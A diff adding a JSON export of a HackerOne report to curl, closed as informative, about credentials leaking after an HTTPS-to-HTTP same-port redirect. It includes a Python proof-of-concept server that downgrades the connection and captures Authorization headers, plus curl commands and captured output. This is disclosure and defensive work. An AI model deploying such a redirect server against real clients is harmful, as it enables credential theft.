@@ -1,0 +1,112 @@
+{
+  "id": 3733946,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzMzOTQ2",
+  "url": "https://hackerone.com/reports/3733946",
+  "title": "Credentials forwarded to HTTP after HTTPS→HTTP same-port redirect — url_set_data_creds uses scheme-blind comparator",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "none",
+  "readable_substate": "Informative",
+  "created_at": "2026-05-13T21:54:56.609Z",
+  "submitted_at": "2026-05-13T21:54:56.970Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "giant_anteater",
+    "url": "/giant_anteater",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/r9sgcvqgyzx7oyd4vqjv580xuk4y/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2022-27774",
+    "CVE-2024-11053"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-05-20T21:23:11.047Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-05-19T13:56:05.750Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi all,\n\nThe recent `creds: hold credentials` refactor — commit `8f71d0fde5` (2026-05-11) (https://github.com/curl/curl/commit/8f71d0fde5) — introduced a credential-leak regression on HTTPS→HTTP same-port redirects. `-u user:pass` and `--oauth2-bearer` both end up in cleartext after a 302 from `https://h:N/` to `http://h:N/...`.\n\nThe short version: `url_set_data_creds` (`lib/url.c:1428-1491`) decides whether OPT credentials survive into a redirected request by comparing the new origin against `data->state.initial_origin`. The comparator is `Curl_peer_same_destination` (`lib/peer.c:333-341`), which compares port + hostname + scopeid + zoneid — but *not* scheme. The scheme-aware comparator `Curl_peer_equal` (`lib/peer.c:313-319`) lives right next door and *is* used by every other auth gate (`Curl_auth_allowed_to_host` at `lib/vauth/vauth.c:140-144`, the custom `Host:` gate at `lib/http.c:1997-1999`). The two are identical except for the `p1->scheme == p2->scheme` line.\n\nBefore 8f71d0fde5, gating ran through `Curl_auth_allowed_to_host` and explicit `Curl_peer_equal(...)` checks. The refactor consolidated everything onto `data->state.creds` being cleared on cross-origin, and the chokepoint that's supposed to do the clearing uses the wrong (scheme-blind) comparator. The patch is one identifier:\n\n```diff\n-     Curl_peer_same_destination(data->state.initial_origin, conn->origin))) {\n+     Curl_peer_equal(data->state.initial_origin, conn->origin))) {\n```\n\nReproducer needs a single-port server that speaks both HTTPS and HTTP. `MSG_PEEK` decides which based on the first byte: if the first byte is `0x16` (TLS ClientHello), wrap the socket in TLS and reply with a 302 to `http://victim.test:9443/secret`; otherwise treat the connection as plain HTTP, capture the request, and look for `Authorization:`.\n\nServer (`server.py`):\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nPoC malicious server for F3 (HTTPS->HTTP scheme downgrade credential leak).\n\nListens on 127.0.0.1:9443. Uses MSG_PEEK to detect TLS (first byte 0x16 =\nClientHello) vs plain TCP. For TLS, wraps the socket, returns a 302 to\nhttp://victim.test:9443/secret. For plain TCP, captures the entire request\nand prints it; if it contains an \"Authorization:\" header, the bug is proven.\n\"\"\"\nimport socket\nimport ssl\nimport sys\nimport threading\nimport time\n\nHOST = \"127.0.0.1\"\nPORT = 9443\nCERT = \"/tmp/poc-f3/cert.pem\"\nKEY = \"/tmp/poc-f3/key.pem\"\n\nREDIRECT = (\n    \"HTTP/1.1 302 Found\\r\\n\"\n    \"Location: http://victim.test:9443/secret\\r\\n\"\n    \"Connection: close\\r\\n\"\n    \"Content-Length: 0\\r\\n\"\n    \"\\r\\n\"\n)\n\nPLAIN_RESPONSE = (\n    \"HTTP/1.1 200 OK\\r\\n\"\n    \"Content-Length: 2\\r\\n\"\n    \"Connection: close\\r\\n\"\n    \"\\r\\n\"\n    \"ok\"\n)\n\n\ndef read_request(sock):\n    buf = b\"\"\n    sock.settimeout(3.0)\n    while b\"\\r\\n\\r\\n\" not in buf and len(buf) < 65536:\n        try:\n            chunk = sock.recv(4096)\n        except socket.timeout:\n            break\n        if not chunk:\n            break\n        buf += chunk\n    return buf\n\n\ndef handle(client):\n    try:\n        head = client.recv(1, socket.MSG_PEEK)\n        if not head:\n            client.close()\n            return\n        if head == b\"\\x16\":\n            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\n            ctx.load_cert_chain(CERT, KEY)\n            tls = ctx.wrap_socket(client, server_side=True)\n            req = read_request(tls)\n            sys.stdout.write(\"\\n========== TLS REQUEST (over HTTPS) ==========\\n\")\n            sys.stdout.write(req.decode(\"latin-1\", \"replace\"))\n            sys.stdout.write(\"==============================================\\n\")\n            sys.stdout.flush()\n            try:\n                tls.sendall(REDIRECT.encode(\"ascii\"))\n                tls.unwrap()\n            except OSError:\n                pass\n            tls.close()\n        else:\n            req = read_request(client)\n            sys.stdout.write(\"\\n########## PLAIN HTTP REQUEST (post-redirect) ##########\\n\")\n            sys.stdout.write(req.decode(\"latin-1\", \"replace\"))\n            sys.stdout.write(\"########################################################\\n\")\n            low = req.lower()\n            if b\"authorization:\" in low:\n                sys.stdout.write(\"[server] !!! LEAK CONFIRMED: Authorization header present in plaintext.\\n\")\n            else:\n                sys.stdout.write(\"[server] no Authorization header captured.\\n\")\n            sys.stdout.flush()\n            client.sendall(PLAIN_RESPONSE.encode(\"ascii\"))\n            client.close()\n    except Exception as e:\n        print(f\"[server] handler error: {e}\", flush=True)\n        try:\n            client.close()\n        except Exception:\n            pass\n\n\ndef main():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    s.bind((HOST, PORT))\n    s.listen(8)\n    print(f\"[server] listening on {HOST}:{PORT}\", flush=True)\n    s.settimeout(30.0)\n    end = time.time() + 25.0\n    while time.time() < end:\n        try:\n            client, addr = s.accept()\n        except socket.timeout:\n            break\n        t = threading.Thread(target=handle, args=(client,), daemon=True)\n        t.start()\n    s.close()\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\nSelf-signed cert (one-shot):\n\n```bash\nopenssl req -x509 -newkey rsa:2048 -nodes -days 1 \\\n    -subj '/CN=victim.test' \\\n    -keyout /tmp/poc-f3/key.pem -out /tmp/poc-f3/cert.pem\n```\n\nCase 1: `-u user:pass`:\n\n```bash\npython3 server.py &\ncurl -v -L -u user:pass -k \\\n    --resolve victim.test:9443:127.0.0.1 \\\n    https://victim.test:9443/\n```\n\nServer captures (verbatim, both phases):\n\n```text\n[server] listening on 127.0.0.1:9443\n\n========== TLS REQUEST (over HTTPS) ==========\nGET / HTTP/1.1\nHost: victim.test:9443\nAuthorization: Basic dXNlcjpwYXNz\nUser-Agent: curl/8.21.0-DEV\nAccept: */*\n\n==============================================\n\n########## PLAIN HTTP REQUEST (post-redirect) ##########\nGET /secret HTTP/1.1\nHost: victim.test:9443\nAuthorization: Basic dXNlcjpwYXNz\nUser-Agent: curl/8.21.0-DEV\nAccept: */*\n\n########################################################\n[server] !!! LEAK CONFIRMED: Authorization header present in plaintext.\n```\n\n`dXNlcjpwYXNz` is base64(\"user:pass\") — the credential survives the HTTPS→HTTP downgrade. curl's own verbose output corroborates:\n\n```text\n> GET / HTTP/1.1\n> Authorization: Basic dXNlcjpwYXNz\n< HTTP/1.1 302 Found\n< Location: http://victim.test:9443/secret\n* Issue another request to this URL: 'http://victim.test:9443/secret'\n> GET /secret HTTP/1.1\n> Authorization: Basic dXNlcjpwYXNz\n< HTTP/1.1 200 OK\n```\n\nCase 2: `--oauth2-bearer xyz` — same path (the token lands in `data->set.str[STRING_BEARER]`, gated by the same predicate):\n\n```bash\ncurl -v -L --oauth2-bearer xyz -k \\\n    --resolve victim.test:9443:127.0.0.1 \\\n    https://victim.test:9443/\n```\n\nCaptured:\n\n```text\n========== TLS REQUEST (over HTTPS) ==========\nGET / HTTP/1.1\nHost: victim.test:9443\nAuthorization: Bearer xyz\n...\n==============================================\n\n########## PLAIN HTTP REQUEST (post-redirect) ##########\nGET /secret HTTP/1.1\nHost: victim.test:9443\nAuthorization: Bearer xyz\n...\n########################################################\n[server] !!! LEAK CONFIRMED: Authorization header present in plaintext.\n```\n\nFor comparison, `-H \"Authorization: Bearer xyz\"` over the same redirect does *not* leak — that's a separate code path that already strips on cross-origin. And a port-mismatched redirect (`https:9443 → http:8888`) doesn't leak either, because `Curl_peer_same_destination` does compare ports. So the bug requires the redirect to land on the same host *and* port with only the scheme changing — which means default-port HTTPS→HTTP (443/80) is not affected, but non-default-port deployments serving both schemes (dev/staging on 8443, mixed reverse-proxy listeners), and any case where an attacker controls the `Location:` value, are.\n\nSame family as CVE-2022-27774 / CVE-2024-11053.\n\nFYI, I was interested in why this wasn't picked up by tests. It seems the existing \"cross-protocol redirect strips credentials\" tests — `test973`, `test975`, `test779`, `test795` and friends — are broken and don't actually do what we want them to do, as far as I can tell. They each redirect from `http://` to a different scheme (ftp/imap), but because each protocol's port macro (`%HTTPPORT`, `%FTPPORT`, `%IMAPPORT`) is a different number, the redirect always changes both port *and* scheme. The credential-stripping logic short-circuits on the port mismatch and never gets to the scheme check, so if you deleted the `p1->scheme == p2->scheme` line from `Curl_peer_equal` outright, all of these still pass green. Which is roughly what happened in `8f71d0fde5` — the comparator got swapped to a scheme-blind one and nothing in the suite noticed. The scheme leg of that comparison has effectively been dead code from CI's point of view for years. Worth fixing alongside F3, otherwise the next regression here will be just as invisible.\n\nCheers,\nJoshua\n\n## Impact\n\nOn a redirect from https://host:N/ to http://host:N/, libcurl forwards Authorization credentials in plaintext because the cross-origin check uses a scheme-blind comparator (Curl_peer_same_destination) instead of the scheme-aware one (Curl_peer_equal) used everywhere else — any attacker who controls the Location: header value on a non-default-port server, or any MITM on the first hop, can harvest credentials by redirecting to the same host and port over plain HTTP.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 1,
+  "voters": [
+    "2026"
+  ],
+  "severity": {
+    "rating": "none",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
